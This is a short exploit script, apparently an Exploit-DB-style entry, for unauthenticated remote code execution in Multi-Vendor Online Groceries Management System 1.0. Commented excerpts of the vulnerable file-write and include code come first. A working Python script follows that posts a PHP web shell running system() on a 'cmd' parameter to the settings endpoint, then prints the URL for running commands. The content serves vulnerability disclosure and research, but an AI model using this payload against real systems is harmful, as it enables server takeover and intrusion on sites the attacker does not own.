# Exploit Title: Multi-Vendor Online Groceries Management System 1.0 - Remote Code Execution (RCE)
# Date: 4/23/2023
# Author: Or4nG.M4n
# Vendor Homepage: https://www.sourcecodester.com/
# Software Link: https://www.sourcecodester.com/php/15166/multi-vendor-online-groceries-management-system-phpoop-free-source-code.html
# Version: 1.0
# Tested on: windows
#
# Vuln File : SystemSettings.php < here you can inject php code
# 		if(isset($_POST['content'])){
#			foreach($_POST['content'] as $k => $v)
#			file_put_contents("../{$k}.html",$v); <=== put any code into welcome.html or whatever you want
#		}
# Vuln File : home.php < here you can include and execute you're php code
#                   <h3 class="text-center">Welcome</h3>
#                   <hr>
#                   <div class="welcome-content">
#                       <?php include("welcome.html") ?> <=== include 
#                   </div>

import requests 

url = input("Enter url :")
postdata = {'content[welcome]':'<?php if(isset($_REQUEST[\'cmd\'])){ echo "<pre>"; $cmd = ($_REQUEST[\'cmd\']); system($cmd); echo "</pre>"; die; }?>'}
resp = requests.post(url+"/classes/SystemSettings.php?f=update_settings", postdata)
print("[+] injection in welcome page")
print("[+]"+url+"/?cmd=ls -al")
print("\n")